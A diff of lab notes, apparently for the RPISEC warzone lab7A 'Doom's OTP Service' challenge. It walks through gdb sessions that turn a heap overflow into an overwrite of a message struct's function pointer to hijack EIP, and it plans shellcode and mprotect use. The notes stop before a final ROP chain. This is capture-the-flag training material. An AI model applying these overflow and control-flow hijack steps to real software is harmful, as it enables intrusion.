@@ -393,3 +393,619 @@ Then we edit the first message (msg_len is now 144) and this way we overwrite th
 Then we ask the program to print the second message, taking control over the execution.
 
 Then we will worry about the ROP chain/shellcode.
+
+
+Ok, we can also hold shellcode in the message body itself (we just need to send it xored with the stub, so the xor stub decrypts it).
+
+Just to be sure I checked if the entire libc is not linked, but it does not seem that way:
+
+0000| 0xbfe9c0d8 --> 0xbfe9c318 --> 0xbfe9c368 --> 0xbfe9c398 --> 0x8049e70 (<__libc_csu_fini>: push   ebx)
+0004| 0xbfe9c0dc --> 0x1000
+0008| 0xbfe9c0e0 --> 0xb77f2000 --> 0x0
+0012| 0xbfe9c0e4 --> 0x806e7d2 (<__read_nocancel+24>:   pop    ebx)
+0016| 0xbfe9c0e8 --> 0x80ed3a0 --> 0xfbad2088
+0020| 0xbfe9c0ec --> 0x8052e2e (<_IO_new_file_underflow+254>:   cmp    eax,0x0)
+0024| 0xbfe9c0f0 --> 0x0
+0028| 0xbfe9c0f4 --> 0xb77f2000 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xb77f3d4c in __kernel_vsyscall ()
+warning: File "/home/gameadmin/.gdbinit" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
+To enable execution of this file add
+        add-auto-load-safe-path /home/gameadmin/.gdbinit
+line to your configuration file "/root/.gdbinit".
+To completely disable this security protection add
+        set auto-load safe-path /
+line to your configuration file "/root/.gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+        info "(gdb)Auto-loading safe path"
+gdb-peda$ p system
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ p printf
+$1 = {<text variable, no debug info>} 0x8050260 <printf>
+gdb-peda$ p system
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ quit
+Detaching from program: /levels/lab07/lab7A, process 12360
+
+Still, we might wanna check. It might miss the symbol but actually be there.
+
+First, how does this look in libc (lab7C):
+gdb-peda$ x/10wx 0xb75e6190
+0xb75e6190 <__libc_system>:     0x08ec8353      0x1024448b      0x0e67aee8      0x63c38100
+0xb75e61a0 <__libc_system+16>:  0x8500169e      0x830974c0      0xe95b08c4      0xfffffa70
+0xb75e61b0 <__libc_system+32>:  0x6a2c838d      0x65e8fffb
+
+gdb-peda$ searchmem 0x1024448b08ec8353 0xb75a6000 0xb774e000
+Searching for '0x1024448b08ec8353' in range: 0xb75a6000 - 0xb774e000
+Found 2 results, display max 2 items:
+libc : 0xb75c0a30 (<iconv_close>:       push   ebx)
+libc : 0xb75e6190 (<__libc_system>:     push   ebx)
+
+Searching for '0x0e67aee81024448b08ec8353' in range: 0xb75a6000 - 0xb774e000
+Found 1 results, display max 1 items:
+libc : 0xb75e6190 (<__libc_system>:     push   ebx)
+
+OK, now in the lab7A app:
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x08048000 0x080ec000 r-xp      /levels/lab07/lab7A
+0x080ec000 0x080ee000 rw-p      /levels/lab07/lab7A
+0x080ee000 0x08112000 rw-p      [heap]
+0xb7ffd000 0xb7ffe000 r-xp      [vdso]
+0xb7ffe000 0xb8000000 r--p      [vvar]
+0xbffdf000 0xc0000000 rw-p      [stack]
+gdb-peda$ searchmem 0x1024448b08ec8353 0x08048000 0x080ec000
+Searching for '0x1024448b08ec8353' in range: 0x8048000 - 0x80ec000
+Not found
+
+Nah. Not linked.
+
+But we have mmap:
+gdb-peda$ p mmap
+$1 = {<text variable, no debug info>} 0x806f260 <mmap>
+
+Oh, I meant mprotect:
+
+
+gdb-peda$ p mprotect
+$3 = {<text variable, no debug info>} 0x806f340 <mprotect>
+
+
+int mprotect(void *addr, size_t len, int prot);
+
+Fuck. The main problem we have here is that these functions take multiple arguments, while the function we will be hijacking takes one.
+
+The other way that could possibly work is a single ROP instruction, or more precisely, a ROP chain intertwined with with interactions with the menu print function.
+
+OK. Let's overwrite this first, then we'll play with gdb.
+
+
+How arguments are passed:
+
+This is a breakpoint right before this (line 199):
+    /* print the message of interest */
+    messages[i]->print_msg(messages[i]);
+
+
+   0x8049512 <print_index+145>: mov    edx,DWORD PTR [ebp-0x30]
+   0x8049515 <print_index+148>: mov    edx,DWORD PTR [edx*4+0x80edf60]
+   0x804951c <print_index+155>: mov    DWORD PTR [esp],edx  <-- the argument is being passed here, from edx, on the top of the stack
+=> 0x804951f <print_index+158>: call   eax					<-- this is how print_msg is called, its address is put to eax and now called
+   0x8049521 <print_index+160>: mov    eax,0x0
+   0x8049526 <print_index+165>: mov    ecx,DWORD PTR [ebp-0xc]
+   0x8049529 <print_index+168>: xor    ecx,DWORD PTR gs:0x14
+   0x8049530 <print_index+175>: je     0x8049537 <print_index+182>
+Guessed arguments:
+arg[0]: 0x80f09d0 --> 0x8048fd3 (<print_message>:       push   ebp)
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6b0 --> 0x80f09d0 --> 0x8048fd3 (<print_message>:  push   ebp)
+0004| 0xbffff6b4 --> 0x0
+0008| 0xbffff6b8 --> 0xa ('\n')
+0012| 0xbffff6bc --> 0x80ec240 --> 0xfbad2887
+0016| 0xbffff6c0 --> 0x80ec240 --> 0xfbad2887
+0020| 0xbffff6c4 --> 0x29 (')')
+0024| 0xbffff6c8 --> 0x0
+0028| 0xbffff6cc --> 0x8000a30
+
+gdb-peda$ x/20 $esp
+0xbffff6b0:     0x080f09d0      0x00000000      0x0000000a      0x080ec240
+0xbffff6c0:     0x080ec240      0x00000029      0x00000000      0x08000a30
+0xbffff6d0:     0x080ec240      0x0000000a      0x00000029      0x08050280
+0xbffff6e0:     0x080ec240      0x080c035e      0x00000004      0x39819500
+0xbffff6f0:     0x00000000      0x080ebfbc      0xbffff728      0x0804967e
+
+So yes, the argument is being passed over the stack.
+0x080f09d0 is a pointer pointing at the messages array. messages is an array of pointers pointing at malloc()-ed message structures on the heap.
+
+messages is messages[0] (not the beginning of the array, which resides in the data segment, but the actual contents of it, which means the first pointer).
+
+It's at 0x080f09d0 (which belongs to the heap). The first dword of the space pointed by it contains 0x8048fd3, which happens to be the address of the print_msg function, because that's the first field of the message structure:
+
+gdb-peda$ x/20wx 0x080f09d0
+0x80f09d0:      0x08048fd3      0x2cddb480      0x10fcf87b      0x392b6497 
+0x80f09e0:      0x0b4dca50      0x11001117      0x7d99bfc9      0x1eae9785
+0x80f09f0:      0x7a738a78      0x4cc729f9      0x5444493c      0x054e9fdb
+0x80f0a00:      0x7894445f      0x3136704f      0x6e6c25dc      0x45753826
+0x80f0a10:      0x4998b056      0x0af270c5      0x626bd2b3      0x6e1d5dbd
+
+0x80f09d0:      0x08048fd3 <-- is the print_msg address, the rest is the message body.
+
+OK, so now we know what argument is passed to the function call we are about to hijack. OK, so where is the saved RET here? Ah right, we are not in the call yet. After stepping in:
+
+0x08048fd3 in print_message ()
+gdb-peda$ x/20wx $esp
+0xbffff6ac:     0x08049521      0x080f09d0      0x00000000      0x0000000a 		
+0xbffff6bc:     0x080ec240      0x080ec240      0x00000029      0x00000000
+0xbffff6cc:     0x08000a30      0x080ec240      0x0000000a      0x00000029
+0xbffff6dc:     0x08050280      0x080ec240      0x080c035e      0x00000004
+0xbffff6ec:     0x39819500      0x00000000      0x080ebfbc      0xbffff728
+
+0xbffff6ac:     0x08049521 <-- here it is
+Yup:
+gdb-peda$ x/1i 0x08049521
+   0x8049521 <print_index+160>: mov    eax,0x0
+gdb-peda$
+
+The stack will look exactly the same when the from print_msg will be called. So the execution control goes to 0x08049521. Hence, we don't need to worry about cleaning anything from the stack (we won't look for pop2ret/pop3ret gadgets, just logic + ret). It seems this is how the stack will look like when we hijack the execution.
+
+
+Fine, let's overwrite the EIP then.
+
+gdb-peda$ c
+Continuing.
++---------------------------------------+
+|        Doom's OTP Service v1.0        |
++---------------------------------------+
+|------------ Services Menu ------------|
+|---------------------------------------|
+| 1. Create secure message              |
+| 2. Edit secure message                |
+| 3. Destroy secure message             |
+| 4. Print message details              |
+| 5. Quit                               |
++---------------------------------------+
+Enter Choice: 1
+-----------------------------------------
+-Using message slot #0
+-Enter data length: 131
+-Enter data to encrypt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCC
+-Message created successfully!
+
+
+
+Breakpoint 4, 0x0804953f in print_menu ()
+gdb-peda$ p message
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ p messages
+$5 = 0x80f09d0
+gdb-peda$ x/100wx 0x80f09d0
+0x80f09d0:      0x08048fd3      0x6b6bba64      0x0801739d      0x212d1bab
+0x80f09e0:      0x7c6bcb7b      0x059b3367      0x3fdbb330      0x76df55f4
+0x80f09f0:      0x52625d60      0x141ffc6c      0x7c2df5cf      0x4af6a1bf
+0x80f0a00:      0x45566cbc      0x6a9a1bab      0x106bd9e6      0x0eef1d12
+0x80f0a10:      0x758c8c70      0x72d7ac99      0x7d0c7acf      0x03dd94b4
+0x80f0a20:      0x1a07d82c      0x41befd2d      0x6806a753      0x74e97a34
+0x80f0a30:      0x0b34b732      0x7c112561      0x10095045      0x729a5bf7
+0x80f0a40:      0x6512c23c      0x6a78122e      0x41706afd      0x7af21397
+0x80f0a50:      0x55e3cc93      0x2a2afb25      0x494032dc      0x606c5aea
+0x80f0a60:      0x3d2a8a3a      0x44da7226      0x7e9af271      0x379e14b5
+0x80f0a70:      0x13231c21      0x555ebd2d      0x3d6cb48e      0x0bb7e0fe
+0x80f0a80:      0x04172dfd      0x2bdb5aea      0x512a98a7      0x4fae5c53
+0x80f0a90:      0x34cdcd31      0x3396edd8      0x3c4d3b8e      0x429cd5f5
+0x80f0aa0:      0x5b46996d      0x00ffbc6c      0x2947e612      0x35a83b75
+0x80f0ab0:      0x4a75f673      0x3d506420      0x51481104      0x33db1ab6
+0x80f0ac0:      0x2453837d      0x2b39536f      0x00312bbc      0x3bb352d6
+0x80f0ad0:      0x14a28dd2      0x00434343      0x00000000      0x00020529 <-- so yeah, we overwrote the length field with 0x00434343.
+0x80f0ae0:      0x00000000      0x00000000      0x00000000      0x00000000
+
+lab7A@warzone:/tmp$ printf "%d" 0x43434300
+1128481536lab7A@warzone:/tmp$
+
+A long number.
+Now, let's see what happens when we edit the message (we'll overflow it a bit).
+
+lab7A@warzone:/tmp$ python -c 'print "B"*500'
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
++---------------------------------------+
+Enter Choice: 2
+-----------------------------------------
+-Input message index to edit: 0
+-Input new message to encrypt: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+-Message has been successfully modified!
+
+Yup, a beautiful heap overflow we have here:
+
+gdb-peda$ x/300wx 0x80f09d0
+0x80f09d0:      0x08048fd3      0x6b6bba64      0x0801739d      0x212d1bab
+0x80f09e0:      0x7c6bcb7b      0x059b3367      0x3fdbb330      0x76df55f4
+0x80f09f0:      0x52625d60      0x141ffc6c      0x7c2df5cf      0x4af6a1bf
+0x80f0a00:      0x45566cbc      0x6a9a1bab      0x106bd9e6      0x0eef1d12
+0x80f0a10:      0x758c8c70      0x72d7ac99      0x7d0c7acf      0x03dd94b4
+0x80f0a20:      0x1a07d82c      0x41befd2d      0x6806a753      0x74e97a34
+0x80f0a30:      0x0b34b732      0x7c112561      0x10095045      0x729a5bf7
+0x80f0a40:      0x6512c23c      0x6a78122e      0x41706afd      0x7af21397
+0x80f0a50:      0x55e3cc93      0x2929f826      0x4a4331df      0x636f59e9
+0x80f0a60:      0x3e298939      0x47d97125      0x7d99f172      0x349d17b6
+0x80f0a70:      0x10201f22      0x565dbe2e      0x3e6fb78d      0x08b4e3fd
+0x80f0a80:      0x07142efe      0x28d859e9      0x52299ba4      0x4cad5f50
+0x80f0a90:      0x37cece32      0x3095eedb      0x3f4e388d      0x419fd6f6
+0x80f0aa0:      0x58459a6e      0x03fcbf6f      0x2a44e511      0x36ab3876
+0x80f0ab0:      0x4976f570      0x3e536723      0x524b1207      0x30d819b5
+0x80f0ac0:      0x2750807e      0x283a506c      0x033228bf      0x38b051d5
+0x80f0ad0:      0x17a18ed1      0x42424242      0x42424242      0x42424242
+0x80f0ae0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0af0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b00:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b10:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b20:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b30:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b40:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b50:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b60:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b70:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b80:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0b90:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0ba0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0bb0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0bc0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0bd0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0be0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0bf0:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0c00:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0c10:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0c20:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0c30:      0x42424242      0x42424242      0x42424242      0x42424242
+0x80f0c40:      0x42424242      0x42424242      0x0000000a      0x00000000
+0x80f0c50:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c60:      0x00000000      0x00000000      0x00000000      0x00000000
+
+OK, cool. Let's proceed to a careful overwrite of a pointer. Luckily, we don't have to be very careful when it comes to the length, 'CCC' (0x0043434) is good enough, because
+we don't have to fill the entire buffer - just as we saw above.
+
+1. We create a message with declared length 131 and following content:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCC
+
+2. We create a second message with any length and content (irrelevant now).
+
+3. We edit the first message, filling it with this payload (ZZZZ will be the hijacked EIP):
+$ python -c 'print "A"*140+"Z"*4'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZZZ
+
+4. We ask the program to print the second message (index 2).
+
+lab7A@warzone:/tmp$ gdb ./lab7A
+Reading symbols from ./lab7A...(no debugging symbols found)...done.
+gdb-peda$ break print_menu
+Breakpoint 1 at 0x804953f
+gdb-peda$ run
+Starting program: /tmp/lab7A
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x0
+EDX: 0x80ed518 --> 0x0
+ESI: 0x0
+EDI: 0x80ebfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6d0 --> 0x80ec240 --> 0xfbad2087
+EIP: 0x804953f (<print_menu+6>: mov    eax,gs:0x14)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049539 <print_menu>:      push   ebp
+   0x804953a <print_menu+1>:    mov    ebp,esp
+   0x804953c <print_menu+3>:    sub    esp,0x28
+=> 0x804953f <print_menu+6>:    mov    eax,gs:0x14
+   0x8049545 <print_menu+12>:   mov    DWORD PTR [ebp-0xc],eax
+   0x8049548 <print_menu+15>:   xor    eax,eax
+   0x804954a <print_menu+17>:   mov    DWORD PTR [esp],0x80c0190
+   0x8049551 <print_menu+24>:   call   0x8050bf0 <puts>
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6d0 --> 0x80ec240 --> 0xfbad2087
+0004| 0xbffff6d4 --> 0x0
+0008| 0xbffff6d8 --> 0x0
+0012| 0xbffff6dc --> 0x804f4f6 (<srandom+54>:   cmp    DWORD PTR gs:0xc,0x0)
+0016| 0xbffff6e0 --> 0x5c970222
+0020| 0xbffff6e4 --> 0x80ec020 --> 0x80ec050 --> 0xa10c5b82
+0024| 0xbffff6e8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:       push   ebx)
+0028| 0xbffff6ec --> 0x80481a8 (<_init>:        push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804953f in print_menu ()
+gdb-peda$ c
+Continuing.
++---------------------------------------+
+|        Doom's OTP Service v1.0        |
++---------------------------------------+
+|------------ Services Menu ------------|
+|---------------------------------------|
+| 1. Create secure message              |
+| 2. Edit secure message                |
+| 3. Destroy secure message             |
+| 4. Print message details              |
+| 5. Quit                               |
++---------------------------------------+
+Enter Choice: 1
+-----------------------------------------
+-Using message slot #0
+-Enter data length: 131
+-Enter data to encrypt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCC
+-Message created successfully!
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x1
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x80ed518 --> 0x0
+EDX: 0x1
+ESI: 0x0
+EDI: 0x80ebfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6d0 --> 0x80ec240 --> 0xfbad2887
+EIP: 0x804953f (<print_menu+6>: mov    eax,gs:0x14)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049539 <print_menu>:      push   ebp
+   0x804953a <print_menu+1>:    mov    ebp,esp
+   0x804953c <print_menu+3>:    sub    esp,0x28
+=> 0x804953f <print_menu+6>:    mov    eax,gs:0x14
+   0x8049545 <print_menu+12>:   mov    DWORD PTR [ebp-0xc],eax
+   0x8049548 <print_menu+15>:   xor    eax,eax
+   0x804954a <print_menu+17>:   mov    DWORD PTR [esp],0x80c0190
+   0x8049551 <print_menu+24>:   call   0x8050bf0 <puts>
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6d0 --> 0x80ec240 --> 0xfbad2887
+0004| 0xbffff6d4 --> 0xa ('\n')
+0008| 0xbffff6d8 --> 0x0
+0012| 0xbffff6dc --> 0x8050280 (<printf+32>:    add    esp,0x1c)
+0016| 0xbffff6e0 --> 0x0
+0020| 0xbffff6e4 --> 0x20 (' ')
+0024| 0xbffff6e8 --> 0x80f09d0 --> 0x8048fd3 (<print_message>:  push   ebp)
+0028| 0xbffff6ec --> 0x80481a8 (<_init>:        push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804953f in print_menu ()
+gdb-peda$
+Continuing.
++---------------------------------------+
+|        Doom's OTP Service v1.0        |
++---------------------------------------+
+|------------ Services Menu ------------|
+|---------------------------------------|
+| 1. Create secure message              |
+| 2. Edit secure message                |
+| 3. Destroy secure message             |
+| 4. Print message details              |
+| 5. Quit                               |
++---------------------------------------+
+Enter Choice: 1
+-----------------------------------------
+-Using message slot #1
+-Enter data length: 50
+-Enter data to encrypt: irrelevant
+-Message created successfully!
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x1
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x80ed518 --> 0x0
+EDX: 0x1
+ESI: 0x0
+EDI: 0x80ebfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6d0 --> 0x80ec240 --> 0xfbad2887
+EIP: 0x804953f (<print_menu+6>: mov    eax,gs:0x14)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049539 <print_menu>:      push   ebp
+   0x804953a <print_menu+1>:    mov    ebp,esp
+   0x804953c <print_menu+3>:    sub    esp,0x28
+=> 0x804953f <print_menu+6>:    mov    eax,gs:0x14
+   0x8049545 <print_menu+12>:   mov    DWORD PTR [ebp-0xc],eax
+   0x8049548 <print_menu+15>:   xor    eax,eax
+   0x804954a <print_menu+17>:   mov    DWORD PTR [esp],0x80c0190
+   0x8049551 <print_menu+24>:   call   0x8050bf0 <puts>
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6d0 --> 0x80ec240 --> 0xfbad2887
+0004| 0xbffff6d4 --> 0xa ('\n')
+0008| 0xbffff6d8 --> 0x0
+0012| 0xbffff6dc --> 0x8050280 (<printf+32>:    add    esp,0x1c)
+0016| 0xbffff6e0 --> 0x1
+0020| 0xbffff6e4 --> 0x20 (' ')
+0024| 0xbffff6e8 --> 0x80f0ae0 --> 0x8048fd3 (<print_message>:  push   ebp)
+0028| 0xbffff6ec --> 0x80481a8 (<_init>:        push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804953f in print_menu ()
+gdb-peda$ c
+Continuing.
++---------------------------------------+
+|        Doom's OTP Service v1.0        |
++---------------------------------------+
+|------------ Services Menu ------------|
+|---------------------------------------|
+| 1. Create secure message              |
+| 2. Edit secure message                |
+| 3. Destroy secure message             |
+| 4. Print message details              |
+| 5. Quit                               |
++---------------------------------------+
+Enter Choice: 2
+-----------------------------------------
+-Input message index to edit: 0
+-Input new message to encrypt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZZZ
+-Message has been successfully modified!
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x1
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x80ed518 --> 0x0
+EDX: 0x1
+ESI: 0x0
+EDI: 0x80ebfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6d0 --> 0x80ec240 --> 0xfbad2887
+EIP: 0x804953f (<print_menu+6>: mov    eax,gs:0x14)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049539 <print_menu>:      push   ebp
+   0x804953a <print_menu+1>:    mov    ebp,esp
+   0x804953c <print_menu+3>:    sub    esp,0x28
+=> 0x804953f <print_menu+6>:    mov    eax,gs:0x14
+   0x8049545 <print_menu+12>:   mov    DWORD PTR [ebp-0xc],eax
+   0x8049548 <print_menu+15>:   xor    eax,eax
+   0x804954a <print_menu+17>:   mov    DWORD PTR [esp],0x80c0190
+   0x8049551 <print_menu+24>:   call   0x8050bf0 <puts>
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6d0 --> 0x80ec240 --> 0xfbad2887
+0004| 0xbffff6d4 --> 0xa ('\n')
+0008| 0xbffff6d8 --> 0x0
+0012| 0xbffff6dc --> 0x8050280 (<printf+32>:    add    esp,0x1c)
+0016| 0xbffff6e0 --> 0x80ec240 --> 0xfbad2887
+0020| 0xbffff6e4 --> 0x80c035e ("Enter Choice: ")
+0024| 0xbffff6e8 --> 0x2
+0028| 0xbffff6ec --> 0x80481a8 (<_init>:        push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804953f in print_menu ()
+gdb-peda$ p messages
+$1 = 0x80f09d0
+gdb-peda$ x/200wx messages
+0x80f09d0:      0x08048fd3      0x646ef8ff      0x12463ede      0x3cac53d0
+0x80f09e0:      0x7fefc5e3      0x011a9bed      0x241038db      0x62664809
+0x80f09f0:      0x1e4b78ff      0x6507aa3f      0x46f57788      0x64573fd3
+0x80f0a00:      0x785081d0      0x6d7cc3da      0x36714dc2      0x349c4269
+0x80f0a10:      0x2c6d9e31      0x0c3c08ba      0x6bca934a      0x2f85d1e3
+0x80f0a20:      0x7c0df8f2      0x7e215770      0x22b4efa9      0x19ea16f5
+0x80f0a30:      0x37ef7928      0x27cebf1f      0x0be5ade4      0x686e8985
+0x80f0a40:      0x5aaf9a13      0x1fce7922      0x4cbe5a1d      0x01af0baf
+0x80f0a50:      0x043d7221      0x252fb9be      0x53077f9f      0x7ded1291
+0x80f0a60:      0x3eae84a2      0x405bdaac      0x6551799a      0x23270948
+0x80f0a70:      0x5f0a39be      0x2446eb7e      0x07b436c9      0x25167e92
+0x80f0a80:      0x3911c091      0x2c3d829b      0x77300c83      0x75dd0328
+0x80f0a90:      0x6d2cdf70      0x4d7d49fb      0x2a8bd20b      0x6ec490a2
+0x80f0aa0:      0x3d4cb9b3      0x3f601631      0x63f5aee8      0x58ab57b4
+0x80f0ab0:      0x76ae3869      0x668ffe5e      0x4aa4eca5      0x292fc8c4
+0x80f0ac0:      0x1beedb52      0x5e8f3863      0x0dff1b5c      0x40ee4aee
+0x80f0ad0:      0x457c3360      0x41414141      0x41414141      0x41414141
+0x80f0ae0:      0x5a5a5a5a      0x5f04980a      0x3e5b5f7f      0x042d3804
+0x80f0af0:      0x601f34e8      0x626b985a      0x6693800d      0x7e6aade7
+0x80f0b00:      0x4773429a      0x2d88f795      0x62c1edba      0x3fc3c46a
+0x80f0b10:      0x1b05bb6f      0x19333b7c      0x746006d3      0x477359a1
+0x80f0b20:      0x256f4436      0x602a9a1e      0x76f92b84      0x217d3d29
+0x80f0b30:      0x5e4bf18e      0x19ae1b2d      0x3b67541e      0x163b6ab7
+0x80f0b40:      0x417cda4c      0x474d0202      0x7ea9f43c      0x1c2c7460
+0x80f0b50:      0x671b7b24      0x4b684e59      0x1ddb800f      0x6b58ed45
+0x80f0b60:      0x2a6ce754      0x3a76ea92      0x5f2d3a13      0x04274c6a
+0x80f0b70:      0x601f34e8      0x626b985a      0x6693800d      0x7e6aade7
+0x80f0b80:      0x4773429a      0x2d88f795      0x62c1edba      0x3fc3c46a
+0x80f0b90:      0x1b05bb6f      0x19333b7c      0x746006d3      0x477359a1
+0x80f0ba0:      0x256f4436      0x602a9a1e      0x76f92b84      0x217d3d29
+0x80f0bb0:      0x5e4bf18e      0x19ae1b2d      0x3b67541e      0x163b6ab7
+0x80f0bc0:      0x417cda4c      0x474d0202      0x7ea9f43c      0x1c2c7460
+0x80f0bd0:      0x671b7b24      0x4b684e59      0x1ddb800f      0x6b58ed45
+0x80f0be0:      0x2a6ce754      0x00000032      0x00000000      0x00020419
+0x80f0bf0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c00:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c10:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c20:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c30:      0x00000000      0x00000000      0x00000000      0x00000000
